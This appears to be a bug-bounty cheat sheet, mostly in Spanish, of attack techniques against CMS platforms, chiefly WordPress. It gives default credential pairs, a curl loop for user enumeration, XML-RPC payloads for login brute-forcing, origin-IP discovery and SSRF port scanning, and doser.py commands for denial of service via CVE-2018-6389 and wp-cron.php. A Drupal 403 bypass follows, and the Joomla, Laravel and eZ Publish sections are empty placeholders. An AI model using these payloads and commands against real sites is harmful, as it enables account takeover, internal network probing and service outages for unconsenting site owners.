## Summary
* [Credentials for Testing Login](#credentials-for-testing-login)
* [Acces Hidden Sign-Up Pages](#access-hidden-sign-up-pages)
* [Wordpress](#wordpress)
	* [Tools](#tools)
	* [Sensitive Paths](#sensitive-paths)
	* [User Enumeration](#user-enumeration)
	* [XMLRPC](#xmlrpc)
	* [CVE-2018-6389](#cve-2018-6389)
	* [WP Cronjob DoS](#wp-cronjob-dos)
* [Drupal](#drupal)
	* [Find hidden Pages on Drupal](#find-hidden-pages-on-drupal)
	* [Bypass 403](#bypass-403)
* [Joomla](#joomla)
* [Laravel](#laravel)
* [eZ Publish](#ez-publish)

## Credentials for Testing Login

```
admin:admin
test:test
admin:password
admin:pass
test@test.com:test
test@company.com:test (try with all domains that belong to company)
test@company.com:test@company.com
```

## Access hidden sign-up pages

Sometimes, developers think that hiding a button is enough. Try accessing the following sign-up URIs while doing bug bounties:

```
CMS platform  |     Sign-up URI

Laravel       |     /register
Drupal        |     /user/register
WordPress     |     /wp-login.php?action=register
eZ Publish    |     /register
```

## WordPress

### Tools

Puede utilizar [wpscan](https://github.com/wpscanteam/wpscan) para auditar sitios Wordpress.

### Sensitive Paths

Buscar siempre este directorio:

```
https://vulnerable.com/wp-content/uploads/
```

### User Enumeration

Puede verificar los usuarios rápidamente:

```
http://vulnerable.com/?author=1
```

```
http://vulnerable.com/wp-json/wp/v2/users/
```

Un posible script para una enumeración rápida:

```
for i in {1..50}; do curl -s -L -i https://vulnerable.com/wordpress\?author=$i | grep -E -o "Location:.*" | awk -F/ '{print $NF}'; done
```

*NOTA: Si tiene `xmlrpc.php` y esta enumeración de usuario, puede encadenarlos y realizar Bruteforce a través de `xmlrpc.php`. Seguramente mostrará un esfuerzo adicional y también aumentará el impacto.*

### XMLRPC

Puede utilizar esta tool [XMLRPC-Scan](https://github.com/nullfil3/xmlrpc-scan) para esta vulnerabilidad específica.

Debe explotar este fallo al máximo, con el fin de mostrar su impacto real.

#### Detección

Vaya a:
```
https://vulnerable.com/xmlrpc.php
```

Y obtendrá el mensaje de error sobre el método POST, como este:
```html
XML-RPC server accepts POST requests only.
```

*Tenga en cuenta que en ausencia del ejemplo de respuesta presentado anteriormente, no tiene sentido continuar con la prueba real de las vulnerabilidades. La respuesta puede variar según la configuración de la instalación de WordPress.*

#### Explotación

- Intercepte la petición y cambie el método HTTP a `POST`

- Liste todos los métodos disponibles:
```
<?xml version="1.0" encoding="iso-8859-1"?>
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```

- Verifique si el método `pingback.ping` está disponible, el cual le dará la IP real detrás del WAF:

```xml
<?xml version="1.0" encoding="iso-8859-1"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
	<value>
		<string>
		http://[YOUR_SERVER]:[port]/[path1]/[path2]
		</string></value>
</param>
<param>
	<value>
		<string>http://[SOME_VALID_BLOG_FROM_THE_SITE]/[path1]/[path2]</string>
	</value>
</param>
</params>
</methodCall>
```

Desde este punto:

1. Puede realizar un ataque DoS/DDoS contra el aplicativo con `Intruder`, o con `cURL`: (el fichero `pingback.xml` contiene el código anterior)
```
curl -X POST -d @pingback.xml https://vulnerable.com/xmlrpc.php
```

2. Puede realizar fuerza bruta al login:
```xml
<?xml version="1.0" encoding="iso-8859-1"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param>
	<value>administrator</value>
</param>
<param>
	<value>pass</value>
</param>
</params>
</methodCall>
```

3. Puede realizar SSRF escaneando los puertos internos del servidor víctima.

*NOTA: Esta técnica está en deshuso en las últimas versiones de Wordpress.*

Para el ejemplo se utiliza Burp Collaborator, sin embargo este puede ser modificado con algún host INTERNO o EXTERNO. La idea acá es escanear algún HOST interno, los puertos de `127.0.0.1`, la subred, etc.:

```xml
<?xml version="1.0" encoding="iso-8859-1"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
	<value>
		<string>
		http://127.0.0.1:§22§/
		</string></value>
</param>
<param>
	<value>
		<string>http://[SOME_VALID_BLOG_FROM_THE_SITE]/[path1]/[path2]</string>
	</value>
</param>
</params>
</methodCall>
```

El tiempo de respuesta puede dar indicios concisos sobre un puerto/servidor `Open`/`Closed`.

Además, cuando se observa la respuesta, debe haber un identificador int distinto de 0 para confirmar que el puerto/servidor está activo. 

<img src="https://user-images.githubusercontent.com/43796175/117901932-05f76200-b292-11eb-8c78-32d98a6968af.jpg">

Caso contrario, el puerto/servidor está inactivo.

[Reference](https://hackerone.com/reports/406387)

### CVE-2018-6389

This issue can down any Wordpress site under `4.9.3` version. So while reporting make sure that your target website is running wordpress under 4.9.3

#### Detección

Verifique que puede cargar scripts a través del panel `/wp-admin`:

```
https://vulnerable.com/wp-admin/load-scripts.php?load=eutil,common
```

Luego, compruebe si la siguiente solicitud devuelve una respuesta favorable:

```
https://vulnerable.com/wp-admin/load-scripts.php?load=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter
```

#### Exploit

Puede utilizar cualquier tool de DoS.

[Doser](https://github.com/quitten/doser.py) es buena para este propósito. El servidor web caerá en los próximos 30 segundos

```python
python3 doser.py -t 999 -g 'https://vulnerable/[listaDeTodosLosScripts]'
```

[Reference](https://hackerone.com/reports/752010)

### WP Cronjob DoS

Esta es otra área para realizar DoS en Wordpress.

#### Detección

Vaya a:
```
https://vulnerable.com/wp-cron.php
```

Y si ve una página en blanco, está en el camino correcto.

#### Exploit

Puede utilzar [Doser](https://github.com/quitten/doser.py) nuevamente para este propósito.
```
python3 doser.py -t 999 -g 'https://vulnerable.com/wp-cron.php'
```

[Reference](https://medium.com/@thecpanelguy/the-nightmare-that-is-wpcron-php-ae31c1d3ae30)


## Drupal

### Find hidden Pages on Drupal

If you are hunting on a Drupal website, fuzz with Intruder (Burp Suite) on ‘/node/$’ where ‘$’ is a number (from 1 to 500). For example:

```
https://target.com/node/1
https://target.com/node/2
https://target.com/node/3
…
https://target.com/node/499
https://target.com/node/500
```

Chances are that you will find hidden pages (test, dev) which are not referenced by the search engines.

### Bypass 403
```
http://drupal.com/modules/node/1 --> 403 Forbidden
http://drupal.com/modules/%2e/node/1 --> 200 OK
```


## Joomla

...

## Laravel

...

## eZ Publish

...

